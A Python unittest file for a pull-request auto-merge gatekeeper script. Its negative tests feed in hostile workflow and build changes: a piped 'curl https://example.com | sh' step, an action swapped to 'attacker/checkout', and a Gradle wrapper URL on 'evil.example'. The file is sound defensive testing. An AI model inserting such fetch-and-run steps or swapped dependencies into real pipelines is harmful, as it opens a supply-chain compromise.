"""Tests for scripts/merge_ready.py (issue 136). Run: python3 -I scripts/test_merge_ready.py

The GitHub REST API is replaced by a fake; no test touches the network. Every negative case must leave the merge call
unmade (`FakeApi.merged` stays empty)."""

import copy
import io
import re
import subprocess
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import merge_ready  # noqa: E402  # justified: must follow the sys.path insert above

ROOT = Path(__file__).resolve().parent.parent
SCRIPT = ROOT / "scripts" / "merge_ready.py"
REPO = "bondo/listicles2"
SHA = "a" * 40
OTHER_SHA = "b" * 40
N = 77
REQUIRED = ["guards", "tasks", "static"]
PIN_OLD = "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1"
PIN_NEW = "      - uses: actions/checkout@" + "c" * 40 + " # v7.1.0"
SUB_OLD = "        uses: github/codeql-action/init@" + "d" * 40 + " # v4.1.0"
SUB_NEW = "        uses: github/codeql-action/init@" + "e" * 40 + " # v4.2.0"
WRAP_OLD = "distributionUrl=https\\://services.gradle.org/distributions/gradle-9.1-bin.zip"
WRAP_NEW = "distributionUrl=https\\://services.gradle.org/distributions/gradle-9.2-all.zip"
WRAP_PATCH = f"@@ -1,2 +1,2 @@\n-{WRAP_OLD}\n+{WRAP_NEW}\n-distributionSha256Sum={'1' * 64}\n+distributionSha256Sum={'2' * 64}"


def file_entry(name, status="modified", patch="@@ -1 +1 @@\n-old\n+new", previous=None):
    entry = {"filename": name, "status": status, "patch": patch}
    if previous:
        entry["previous_filename"] = previous
    return entry


def run(name, status="completed", conclusion="success", rid=1, app=15368):
    return {"id": rid, "name": name, "status": status, "conclusion": conclusion, "app": {"id": app}}


class FakeApi:
    """Answers the few REST routes merge_ready uses, from a dict keyed by path (no query string)."""

    def __init__(self, data):
        self.data = data
        self.merged = []
        self.requested = []

    def get(self, path):
        self.requested.append(path)
        return copy.deepcopy(self.data[path])

    def pages(self, path, key=None):
        self.requested.append(path)
        return copy.deepcopy(self.data[path])

    def put(self, path, fields):
        self.merged.append((path, dict(fields)))
        return {"merged": True, "sha": "d" * 40}


def make_api(files=None, title="Update the plan", body="Refreshes section 4. See issue 15.", sha=SHA, state="clean", checks=None,
             required=None, commits=None, base="main", counts=None):
    files = files if files is not None else [file_entry("docs/product/flow.md")]
    commits = commits if commits is not None else [{"commit": {"message": "Edit flow doc"}}]
    counts = counts or {}
    pulls = f"repos/{REPO}/pulls/{N}"
    contexts = REQUIRED if required is None else required
    rules = [{"type": "required_status_checks", "parameters": {"required_status_checks": [{"context": c, "integration_id": 15368} for c in contexts]}}]
    return FakeApi(
        {
            pulls: {"head": {"sha": sha}, "base": {"ref": base}, "title": title, "body": body, "mergeable_state": state, "draft": False,
                     "changed_files": counts.get("files", len(files)), "commits": counts.get("commits", len(commits))},
            pulls + "/files": files,
            pulls + "/commits": commits,
            f"repos/{REPO}/rules/branches/{base}": rules,
            f"repos/{REPO}/commits/{SHA}/check-runs": checks if checks is not None else [run(c) for c in REQUIRED],
        }
    )


def go(api, sha=SHA, kind="working-draft-docs"):
    out, err = io.StringIO(), io.StringIO()
    code = merge_ready.main([str(N), sha, kind], api=api, out=out, err=err)
    return code, out.getvalue() + err.getvalue()


class HappyPathTests(unittest.TestCase):
    def test_docs_squash_merge_is_sha_pinned(self):
        api = make_api()
        code, text = go(api)
        self.assertEqual(code, 0, text)
        want = {"merge_method": "squash", "sha": SHA, "commit_title": "Update the plan (#77)", "commit_message": "Refreshes section 4. See issue 15."}
        self.assertEqual(api.merged, [(f"repos/{REPO}/pulls/{N}/merge", want)])

    def test_tasks_sync_with_only_tasks_toml(self):
        api = make_api(files=[file_entry("docs/tasks.toml")])
        self.assertEqual(go(api, kind="tasks-sync")[0], 0)
        self.assertEqual(len(api.merged), 1)

    def test_dependabot_manifests_and_workflow_pin(self):
        patch = f"@@ -3 +3 @@\n-{PIN_OLD}\n+{PIN_NEW}"
        files = [
            file_entry("firebase/package.json"),
            file_entry("firebase/package-lock.json"),
            file_entry("gradle/libs.versions.toml"),
            file_entry("scripts/requirements-lint.txt"),
            file_entry("gradle/wrapper/gradle-wrapper.properties", patch=WRAP_PATCH),
            file_entry(".github/workflows/status.yml", patch=f"@@ -3 +3 @@\n-{SUB_OLD}\n+{SUB_NEW}"),
            file_entry(".github/workflows/ci.yml", patch=patch),
        ]
        api = make_api(files=files)
        self.assertEqual(go(api, kind="dependabot")[0], 0)
        self.assertEqual(len(api.merged), 1)

    def test_extra_check_runs_not_required_do_not_matter(self):
        api = make_api(checks=[run(c) for c in REQUIRED] + [run("optional", conclusion="failure")])
        self.assertEqual(go(api)[0], 0)

    def test_latest_run_of_a_check_counts(self):
        old_red = run("guards", conclusion="failure", rid=1)
        api = make_api(checks=[old_red, run("guards", rid=2), run("tasks"), run("static")])
        self.assertEqual(go(api)[0], 0)


class RefusalTests(unittest.TestCase):
    def refused(self, api, reason, sha=SHA, kind="working-draft-docs"):
        code, text = go(api, sha=sha, kind=kind)
        self.assertNotEqual(code, 0, text)
        self.assertEqual(api.merged, [], "a refused PR must not be merged")
        self.assertRegex(text, reason)

    def test_head_moved_from_the_given_sha(self):
        self.refused(make_api(sha=OTHER_SHA), r"head .*" + OTHER_SHA[:7] + r".*not .*" + SHA[:7])

    def test_behind_is_not_clean(self):
        self.refused(make_api(state="behind"), r"mergeable_state.*behind")

    def test_blocked_dirty_and_unknown_are_not_clean(self):
        for state in ("blocked", "dirty", "unknown", "unstable", "draft", "has_hooks"):
            with self.subTest(state=state):
                self.refused(make_api(state=state), rf"mergeable_state.*{state}")

    def test_red_required_check(self):
        checks = [run("guards"), run("tasks", conclusion="failure"), run("static")]
        self.refused(make_api(checks=checks), r"tasks.*failure")

    def test_pending_required_check(self):
        checks = [run("guards"), run("tasks"), run("static", status="in_progress", conclusion=None)]
        self.refused(make_api(checks=checks), r"static.*(pending|in_progress)")

    def test_missing_required_check(self):
        self.refused(make_api(checks=[run("guards"), run("tasks")]), r"static.*(missing|no check run)")

    def test_skipped_and_neutral_are_not_success(self):
        for conclusion in ("skipped", "neutral", "cancelled", "timed_out", "action_required"):
            with self.subTest(conclusion=conclusion):
                checks = [run("guards"), run("tasks", conclusion=conclusion), run("static")]
                self.refused(make_api(checks=checks), rf"tasks.*{conclusion}")

    def test_no_required_checks_configured_fails_closed(self):
        self.refused(make_api(required=[]), r"required (status )?checks")

    def test_closing_keyword_in_body(self):
        for text in ("Fixes #12", "closes #12", "This will resolve #12.", "Closed: #12", "fix owner/repo#12", "RESOLVED #12"):
            with self.subTest(text=text):
                self.refused(make_api(body=text), r"closing keyword")

    def test_closing_keyword_in_title(self):
        self.refused(make_api(title="Fix #12 in the plan"), r"closing keyword")

    def test_closing_keyword_with_issue_url(self):
        self.refused(make_api(body="fixes https://github.com/bondo/listicles2/issues/12"), r"closing keyword")

    def test_closing_keyword_in_a_commit_message(self):
        commits = [{"commit": {"message": "Edit flow doc\n\nCloses #12"}}]
        self.refused(make_api(commits=commits), r"closing keyword")

    def test_prose_without_issue_number_is_fine(self):
        api = make_api(body="Fixes the typo in the prefix. Closed beta, see #12. Issue 136. Fix 12 items.")
        self.assertEqual(go(api)[0], 0)

    def test_path_outside_docs_kind(self):
        for name in ("scripts/merge_ready.py", "docs/tasks.toml", "docs/ORCHESTRATION.md", "CLAUDE.md", ".github/workflows/ci.yml", "app/src/Main.kt"):
            with self.subTest(name=name):
                files = [file_entry("docs/product/flow.md"), file_entry(name)]
                self.refused(make_api(files=files), re.escape(name))

    def test_tasks_sync_refuses_any_other_file(self):
        files = [file_entry("docs/tasks.toml"), file_entry("docs/product/flow.md")]
        self.refused(make_api(files=files), r"docs/product/flow\.md", kind="tasks-sync")

    def test_dotdot_path_is_refused(self):
        files = [file_entry("docs/product/../../scripts/x.py")]
        self.refused(make_api(files=files), r"\.\.")

    def test_rename_out_of_the_allowed_paths_is_refused(self):
        files = [file_entry("docs/product/new.md", status="renamed", previous="scripts/guards.sh")]
        self.refused(make_api(files=files), r"scripts/guards\.sh")

    def test_dependabot_build_script_is_not_a_manifest(self):
        self.refused(make_api(files=[file_entry("app/build.gradle.kts")]), r"app/build\.gradle\.kts", kind="dependabot")

    def test_dependabot_workflow_change_beyond_a_pin(self):
        patch = f"@@ -3,2 +3,3 @@\n-{PIN_OLD}\n+{PIN_NEW}\n+      - run: curl https://example.com | sh"
        self.refused(make_api(files=[file_entry(".github/workflows/ci.yml", patch=patch)]), r"ci\.yml.*(pin|uses)", kind="dependabot")

    def test_dependabot_workflow_pin_to_a_tag_is_refused(self):
        patch = "@@ -3 +3 @@\n-" + PIN_OLD + "\n+      - uses: actions/checkout@v7"
        self.refused(make_api(files=[file_entry(".github/workflows/ci.yml", patch=patch)]), r"ci\.yml.*(pin|uses)", kind="dependabot")

    def test_dependabot_workflow_without_a_patch_is_refused(self):
        files = [file_entry(".github/workflows/ci.yml")]
        del files[0]["patch"]
        self.refused(make_api(files=files), r"ci\.yml.*patch", kind="dependabot")

    def test_docs_kind_refuses_workflow_pin_changes(self):
        patch = f"@@ -3 +3 @@\n-{PIN_OLD}\n+{PIN_NEW}"
        self.refused(make_api(files=[file_entry(".github/workflows/ci.yml", patch=patch)]), r"ci\.yml")

    def test_queued_rerun_beats_an_older_green_run(self):
        queued = run("guards", status="queued", conclusion=None, rid=9)
        self.refused(make_api(checks=[queued, run("guards", rid=2), run("tasks"), run("static")]), r"guards.*pending")

    def test_success_from_another_app_does_not_count(self):
        self.refused(make_api(checks=[run("guards", app=999), run("tasks"), run("static")]), r"guards.*missing")

    def test_base_other_than_main_is_refused(self):
        self.refused(make_api(base="release"), r"base .*release.*main")

    def test_truncated_file_or_commit_list_is_refused(self):
        for counts, reason in (({"files": 3001}, r"files.*3001"), ({"commits": 251}, r"commits.*251")):
            with self.subTest(counts=counts):
                self.refused(make_api(counts=counts), reason)

    def pin_patch(self, old, new):
        return file_entry(".github/workflows/ci.yml", patch=f"@@ -3 +3 @@\n-{old}\n+{new}")

    def test_dependabot_swapped_action_is_refused(self):
        evil = PIN_NEW.replace("actions/checkout", "attacker/checkout")
        self.refused(make_api(files=[self.pin_patch(PIN_OLD, evil)]), r"ci\.yml.*(pin|uses)", kind="dependabot")

    def test_dependabot_subpath_swap_is_refused(self):
        self.refused(make_api(files=[self.pin_patch(SUB_OLD, SUB_NEW.replace("/init@", "/analyze@"))]), r"ci\.yml.*(pin|uses)", kind="dependabot")

    def test_dependabot_added_or_removed_action_is_refused(self):
        for patch in (f"@@ -3 +3,2 @@\n {PIN_OLD}\n+{PIN_NEW}", f"@@ -3,2 +3 @@\n {PIN_NEW}\n-{PIN_OLD}"):
            with self.subTest(patch=patch):
                files = [file_entry(".github/workflows/ci.yml", patch=patch)]
                self.refused(make_api(files=files), r"ci\.yml.*(pin|uses)", kind="dependabot")

    def test_dependabot_wrapper_other_host_or_property_is_refused(self):
        evil = "distributionUrl=https\\://evil.example/gradle-9.2-bin.zip"
        for patch in (f"@@ -1 +1 @@\n-{WRAP_OLD}\n+{evil}", "@@ -1 +1 @@\n-networkTimeout=10000\n+networkTimeout=1"):
            with self.subTest(patch=patch):
                files = [file_entry("gradle/wrapper/gradle-wrapper.properties", patch=patch)]
                self.refused(make_api(files=files), r"gradle-wrapper\.properties", kind="dependabot")

    def test_no_changed_files_is_refused(self):
        self.refused(make_api(files=[]), r"no changed files")

    def test_all_failures_are_listed(self):
        api = make_api(state="behind", body="fixes #1", files=[file_entry("CLAUDE.md")])
        code, text = go(api)
        self.assertNotEqual(code, 0)
        for reason in ("behind", "closing keyword", "CLAUDE.md"):
            self.assertIn(reason, text)
        self.assertEqual(api.merged, [])


class UsageTests(unittest.TestCase):
    def cli(self, *args):
        return subprocess.run([sys.executable, "-I", str(SCRIPT), *args], capture_output=True, text=True, timeout=30)

    def test_unknown_kind_exits_nonzero_before_any_api_call(self):
        api = make_api()
        code, text = go(api, kind="feature-code")
        self.assertNotEqual(code, 0)
        self.assertIn("unknown kind", text)
        self.assertEqual(api.requested, [])
        self.assertEqual(api.merged, [])

    def test_kinds_are_exactly_the_three_authorized_ones(self):
        self.assertEqual(sorted(merge_ready.KINDS), ["dependabot", "tasks-sync", "working-draft-docs"])

    def test_cli_unknown_kind(self):
        res = self.cli("12", SHA, "everything")
        self.assertNotEqual(res.returncode, 0)
        self.assertIn("unknown kind", res.stderr + res.stdout)

    def test_cli_bad_arguments(self):
        for args in (("x", SHA, "dependabot"), ("12", "abc", "dependabot"), ("12", SHA), ("12", SHA, "dependabot", "extra"), ()):
            with self.subTest(args=args):
                res = self.cli(*args)
                self.assertNotEqual(res.returncode, 0)

    def test_api_error_refuses(self):
        class Broken(FakeApi):
            def get(self, path):
                raise merge_ready.ApiError("boom")

        api = Broken({})
        code, text = go(api)
        self.assertNotEqual(code, 0)
        self.assertIn("boom", text)
        self.assertEqual(api.merged, [])

    def test_merge_api_error_is_a_failure(self):
        class NoMerge(FakeApi):
            def put(self, path, fields):
                raise merge_ready.ApiError("405 not mergeable")

        api = NoMerge(make_api().data)
        code, text = go(api)
        self.assertNotEqual(code, 0)
        self.assertIn("405", text)


class WiringTests(unittest.TestCase):
    """The tests and the script must run in verify.sh and CI, and the process docs must tell the merge agent to run only the script."""

    def read(self, rel):
        return (ROOT / rel).read_text(encoding="utf-8")

    def active(self, text):
        return [ln.strip() for ln in text.splitlines() if ln.strip() and not ln.strip().startswith("#")]

    def test_verify_runs_the_tests(self):
        self.assertIn("step merge-ready-tests python3 -I scripts/test_merge_ready.py", self.active(self.read("scripts/verify.sh")))

    def test_ci_runs_the_tests(self):
        self.assertIn("run: python3 -I scripts/test_merge_ready.py", self.active(self.read(".github/workflows/ci.yml")))

    def test_script_and_tests_are_protected_process_files(self):
        guard = self.read("scripts/hooks/pretooluse_guard.py")
        for path in ("scripts/merge_ready.py", "scripts/test_merge_ready.py"):
            self.assertIn(f'"{path}",', guard)

    def test_docs_tell_the_merge_agent_to_run_from_clean_main(self):
        self.assertRegex(self.read("docs/ORCHESTRATION.md"), r"(?i)clean checkout of `origin/main`")

    def test_docs_tell_the_merge_agent_to_run_only_the_script(self):
        doc = self.read("docs/ORCHESTRATION.md")
        self.assertIn("scripts/merge_ready.py <N> <sha> <kind>", doc)
        self.assertRegex(doc, r"(?i)merge agent[^\n]*runs? only")

    def test_wiring_helper_ignores_commented_lines(self):
        self.assertEqual(self.active("# step x\n  run: y\n"), ["run: y"])


if __name__ == "__main__":
    unittest.main()
